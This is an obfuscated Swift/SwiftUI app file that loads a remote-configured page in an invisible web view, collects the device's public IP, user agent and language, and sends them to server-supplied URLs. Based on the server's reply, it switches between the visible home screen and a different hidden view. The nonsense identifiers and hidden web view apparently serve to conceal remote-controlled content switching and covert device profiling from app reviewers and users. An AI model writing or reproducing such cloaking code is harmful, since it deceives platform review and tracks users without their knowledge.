import SwiftUI
import OneSignalFramework
@preconcurrency import WebKit

struct Wamigejeteye: View {

    @State var nefe: String = ""
    @State private var rudor: Bool?

    @State var soyig: String = ""
    @State var karu = false
    @State var macema = false

    @State private var kuhopidiyi: Bool = true
    @State private var zuce: Bool = true
    @AppStorage(Wugehison.Mobepevahixo.hizi) var vimabehok: Bool = true
    @AppStorage(Wugehison.Mobepevahixo.zacuxajib) var ciwak: Bool = true

    var body: some View {
        ZStack {
            if zuce {
                SplashScreen(loading: true)
                    .zIndex(1)
            }

            if rudor != nil {
                if vimabehok {
                    Joxezahojido(
                        nefe: $nefe,
                        soyig: $soyig,
                        karu: $karu,
                        macema: $macema)
                    .opacity(0)
                    .zIndex(2)
                }

                if karu || !ciwak {
                    Qococebay()
                        .zIndex(3)
                        .onAppear {
                            ciwak = false
                            vimabehok = false
                            zuce = false
                        }
                }

                if macema {
                    if kuhopidiyi {
                        SplashScreen(loading: true)
                            .zIndex(4)
                            .onAppear {
                                AppDelegate.orientationLock = .portrait
                                UIDevice.current.setValue(UIInterfaceOrientation.portrait.rawValue, forKey: Wugehison.Mobepevahixo.yeriq)
                                DispatchQueue.main.asyncAfter(deadline: .now() + 3) { kuhopidiyi = false }
                            }
                    } else {
                        HomeView()
                            .zIndex(5)
                    }
                }
            }
        }
        .animation(.easeInOut, value: zuce)
        .onChange(of: macema) { if $0 { zuce = false } }
        .onAppear {
            OneSignal.Notifications.requestPermission { rudor = $0 }

            guard let xogufah = URL(string: Wugehison.Nozusi.yawimoreto) else { return }

            URLSession.shared.dataTask(with: xogufah) { cetowaci, _, _ in
                guard let cetowaci else { return }

                guard let yiyicuyih = try? JSONSerialization.jsonObject(with: cetowaci, options: []) as? [String: Any] else { return }

                guard let feqem = yiyicuyih[Wugehison.Nozusi.yebo] as? String else { return }

                DispatchQueue.main.async { nefe = feqem }
            }
            .resume()
        }
    }
}

extension Wamigejeteye {

    struct Joxezahojido: UIViewRepresentable {

        @Binding var nefe: String
        @Binding var soyig: String
        @Binding var karu: Bool
        @Binding var macema: Bool

        func makeUIView(context: Context) -> WKWebView {
            let cozodic = WKWebView()
            cozodic.navigationDelegate = context.coordinator

            if let kuvis = URL(string: nefe) {
                var wayojijuw = URLRequest(url: kuvis)
                wayojijuw.httpMethod = "GET"
                wayojijuw.setValue(Wugehison.Mobepevahixo.hosixe, forHTTPHeaderField: Wugehison.Mobepevahixo.xotepajox)

                let madogapuha = [Wugehison.Mobepevahixo.hoxuwixe: Wugehison.Nozusi.gedagijalo,
                                 Wugehison.Mobepevahixo.wufuz: Wugehison.Nozusi.zuqegu]
                for (pocoselefa, kelixo) in madogapuha {
                    wayojijuw.setValue(kelixo, forHTTPHeaderField: pocoselefa)
                }

                cozodic.load(wayojijuw)
            }
            return cozodic
        }

        func updateUIView(_ uiView: WKWebView, context: Context) {}

        func makeCoordinator() -> Kudokut {
            Kudokut(self)
        }

        class Kudokut: NSObject, WKNavigationDelegate {

            var dahebecite: Joxezahojido
            var zejiyeyur: String?
            var fuwov: String?

            init(_ lecagaw: Joxezahojido) {
                self.dahebecite = lecagaw
            }

            func webView(_ nupa: WKWebView, didFinish navigation: WKNavigation!) {
                nupa.evaluateJavaScript(Wugehison.Mobepevahixo.sefaqubuj) { [unowned self] (qiqumulami: Any?, error: Error?) in
                    guard let samixizoce = qiqumulami as? String else {
                        dahebecite.macema = true
                        return
                    }

                    self.nutuxazek(samixizoce)

                    nupa.evaluateJavaScript(Wugehison.Mobepevahixo.satiwuciw) { (ziborihuza, error) in
                        if let beviyonuru = ziborihuza as? String {
                            self.fuwov = beviyonuru
                        }
                    }
                }
            }

            func nutuxazek(_ weloyapo: String) {
                guard let dinacihuj = rate(from: weloyapo) else {
                    dahebecite.macema = true
                    return
                }

                let ximubeqi = dinacihuj.trimmingCharacters(in: .whitespacesAndNewlines)

                guard let reqibo = ximubeqi.data(using: .utf8) else {
                    dahebecite.macema = true
                    return
                }

                do {
                    let minuyimasi = try JSONSerialization.jsonObject(with: reqibo, options: []) as? [String: Any]
                    guard let jeluyesuva = minuyimasi?[Wugehison.Mobepevahixo.jutax] as? String else {
                        dahebecite.macema = true
                        return
                    }

                    guard let qiyudim = minuyimasi?[Wugehison.Mobepevahixo.xefe] as? String else {
                        dahebecite.macema = true
                        return
                    }

                    DispatchQueue.main.async {
                        self.dahebecite.nefe = jeluyesuva
                        self.dahebecite.soyig = qiyudim
                    }

                    self.xilikowulu(with: jeluyesuva)

                } catch {
                    print("\(Wugehison.Mobepevahixo.qaqurux)\(error.localizedDescription)")
                }
            }

            func rate(from weloyapo: String) -> String? {
                guard let startRange = weloyapo.range(of: "{"),
                      let endRange = weloyapo.range(of: "}", options: .backwards) else {
                    return nil
                }

                let rodimoxipo = String(weloyapo[startRange.lowerBound..<endRange.upperBound])
                return rodimoxipo
            }

            func xilikowulu(with puvuyi: String) {
                guard let rocufe = URL(string: puvuyi) else {
                    dahebecite.macema = true
                    return
                }

                soqugu { qehoholibi in
                    guard let qehoholibi else {
                        return
                    }

                    self.zejiyeyur = qehoholibi

                    var wayugikoc = URLRequest(url: rocufe)
                    wayugikoc.httpMethod = "GET"
                    wayugikoc.setValue(Wugehison.Mobepevahixo.hosixe, forHTTPHeaderField: Wugehison.Mobepevahixo.xotepajox)

                    let licu = [
                        Wugehison.Mobepevahixo.cikuvemep: Wugehison.Nozusi.hugun,
                        Wugehison.Mobepevahixo.babe: self.zejiyeyur ?? "",
                        Wugehison.Mobepevahixo.sutag: self.fuwov ?? "",
                        Wugehison.Mobepevahixo.yixa: Locale.preferredLanguages.first ?? Wugehison.Mobepevahixo.vudomep
                    ]

                    for (virodudo, vipari) in licu {
                        wayugikoc.setValue(vipari, forHTTPHeaderField: virodudo)
                    }

                    URLSession.shared.dataTask(with: wayugikoc) { [unowned self] yiquto, lodujuj, error in
                        guard let yiquto, error == nil else {
                            print("\(Wugehison.Mobepevahixo.xeconizu)\(error?.localizedDescription.description ?? Wugehison.Mobepevahixo.pipuv)")
                            dahebecite.macema = true
                            return
                        }
                        if let tohekire = lodujuj as? HTTPURLResponse {
                            print("\(Wugehison.Mobepevahixo.fadivirune)\(tohekire.statusCode)")

                            if tohekire.statusCode == 200 {
                                self.kafek()
                            } else {
                                self.dahebecite.macema = true
                            }
                        }

                        if let mihi = String(data: yiquto, encoding: .utf8) {
                            print("\(Wugehison.Mobepevahixo.videzuhu)\(mihi)")
                        }
                    }.resume()
                }
            }

            func kafek() {

                let liqexeleye = self.dahebecite.soyig

                guard let cajagu = URL(string: liqexeleye) else {
                    dahebecite.macema = true
                    return
                }

                var zafopu = URLRequest(url: cajagu)
                zafopu.httpMethod = "GET"
                zafopu.setValue(Wugehison.Mobepevahixo.hosixe, forHTTPHeaderField: Wugehison.Mobepevahixo.xotepajox)

                let cuvo = [
                    Wugehison.Mobepevahixo.cikuvemep: Wugehison.Nozusi.hugun,
                    Wugehison.Mobepevahixo.babe: self.zejiyeyur ?? "",
                    Wugehison.Mobepevahixo.sutag: self.fuwov ?? "",
                    Wugehison.Mobepevahixo.yixa: Locale.preferredLanguages.first ?? Wugehison.Mobepevahixo.vudomep
                ]

                for (nikilo, vuqup) in cuvo {
                    zafopu.setValue(vuqup, forHTTPHeaderField: nikilo)
                }

                URLSession.shared.dataTask(with: zafopu) { [unowned self] roqo, yojanec, error in
                    guard let roqo = roqo, error == nil else {
                        dahebecite.macema = true
                        return
                    }

                    if let qilodotof = String(data: roqo, encoding: .utf8) {

                        do {
                            let mebezaji = try JSONSerialization.jsonObject(with: roqo, options: []) as? [String: Any]
                            guard let pucipocepa = mebezaji?[Wugehison.Mobepevahixo.detoyuqiw] as? String,
                                  let ludipah = mebezaji?[Wugehison.Mobepevahixo.qigomowec] as? String,
                                  let yilodigeqe = mebezaji?[Wugehison.Mobepevahixo.fukemegag] as? String else {

                                return
                            }

                            Defonuju.shared.pucipocepa = pucipocepa
                            Defonuju.shared.ludipah = ludipah
                            Defonuju.shared.yilodigeqe = yilodigeqe

                            OneSignal.login(Defonuju.shared.yilodigeqe ?? "")
                            OneSignal.User.addTag(key: Wugehison.Mobepevahixo.mapegegamo, value: Defonuju.shared.ludipah ?? "")

                            self.dahebecite.karu = true

                        } catch {
                            dahebecite.macema = true
                        }
                    }
                }.resume()
            }

            func soqugu(completion: @escaping (String?) -> Void) {
                let tayofukiza = URL(string: Wugehison.Mobepevahixo.rehajoyife)!
                let sehixihoy = URLSession.shared.dataTask(with: tayofukiza) { jirodo, rugoyalac, error in
                    guard let jirodo, let ipAddress = String(data: jirodo, encoding: .utf8) else {
                        completion(nil)
                        return
                    }
                    completion(ipAddress)
                }
                sehixihoy.resume()
            }
        }
    }
}
